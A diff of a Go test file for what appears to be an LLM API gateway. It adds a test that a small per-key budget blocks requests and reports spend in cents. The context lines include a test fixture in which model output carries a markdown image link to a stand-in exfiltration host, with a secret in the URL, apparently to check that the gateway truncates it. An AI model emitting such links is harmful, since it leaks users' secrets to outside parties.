@@ -240,6 +240,18 @@ func TestStrictestOverCapBudgetWins(t *testing.T) {
 	}
 }
 
+func TestSmallBudgetShowsCents(t *testing.T) {
+	s := DemoSnapshot()
+	b := s.Budgets["b3"] // batch-summarize's key budget
+	b.CapUSD, b.OnExceed = 0.05, "block"
+	s.Budgets["b3"] = b
+	s.Spend.ByKey["k3"] = 0.061
+	rc := run(t, s, Input{Secret: secret("k3"), Req: chat("gpt-5-mini", "hi")}, &fixedUp{})
+	if rc.Trace[1].Input != "key budget batch-summarize · $0.06 of $0.05" || rc.ErrorDetail != "Key budget batch-summarize is over its $0.05 monthly cap. Ask a finance admin to raise it." {
+		t.Fatalf("budget step %+v, detail %q", rc.Trace[1], rc.ErrorDetail)
+	}
+}
+
 func TestExfilTruncates(t *testing.T) {
 	rc := run(t, DemoSnapshot(), Input{Secret: secret("k1"), Req: chat("gpt-5-mini", "hi")},
 		&fixedUp{content: "fine text ![x](https://exfil.example.net/c?d=secret) more"})
